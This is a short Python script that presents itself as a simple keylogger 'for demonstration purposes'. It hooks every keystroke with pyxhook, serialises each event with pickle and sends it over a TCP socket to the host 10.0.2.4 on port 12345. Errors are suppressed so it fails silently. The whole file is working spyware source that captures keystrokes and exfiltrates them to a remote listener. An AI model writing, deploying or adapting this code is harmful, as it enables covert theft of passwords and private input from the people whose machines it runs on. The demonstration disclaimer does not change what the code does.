#Simple keylogger that connects to given ip address and sends caputred data.
#This is to be used soley for demonstration purposes. 

#!/usr/bin/python
import pyxhook
import pickle
import socket

def keyPress(event):
    try:
        serialized = pickle.dumps(event)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.2.4", 12345))
        s.sendall(serialized)
    except:
        pass

hook = pyxhook.HookManager() 
hook.KeyDown = keyPress
hook.HookKeyboard()
hook.start()
